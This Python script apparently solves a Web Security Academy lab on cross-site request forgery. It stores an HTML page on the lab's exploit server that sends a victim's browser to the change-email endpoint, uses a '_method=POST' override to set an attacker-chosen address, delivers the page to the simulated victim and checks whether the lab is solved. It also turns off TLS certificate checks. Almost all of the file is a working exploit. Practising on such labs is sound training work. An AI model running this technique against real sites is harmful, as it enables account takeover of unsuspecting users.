import time
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def submit_exploit_server(session, url, response_file, response_head, response_body, form_action):
    params = {
        "urlIsHttps": "on",
        "responseFile": response_file,
        "responseHead": response_head,
        "responseBody": response_body,
        "formAction": form_action
    }
    resp = session.post(url, data=params, verify=False, allow_redirects=True)
    if resp.status_code not in (200, 302):
        raise ValueError(f"Exploit server request failed with status code {resp.status_code}")
    return True


def is_lab_solved(session, host):
    resp = session.get(host, verify=False)
    return "Congratulations, you solved the lab!" in resp.text


def main():
    host = "https://0a030014036236dc8082b792004e00f3.web-security-academy.net"
    exploit_host = "https://exploit-0a1800a0030536da80adb66c010c0071.exploit-server.net"

    payload = f'''<html>
	<body>
                <script>
    document.location = "{host}/my-account/change-email?email=pwned@web-security-academy.net&_method=POST";
                 </script>
	</body>
<html>
'''

    response_head = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8"

    session = requests.Session()
    submit_exploit_server(session, f"{exploit_host}/", "/exploit", response_head, payload, "STORE")
    print("Exploit stored.")

    submit_exploit_server(session, f"{exploit_host}/", "/exploit", response_head, payload, "DELIVER_TO_VICTIM")
    print("Exploit delivered to victim.")

    time.sleep(5)
    if is_lab_solved(session, f"{host}/"):
        print("Koated !!!")
    else:
        print("ya siks")


if __name__ == "__main__":
    main()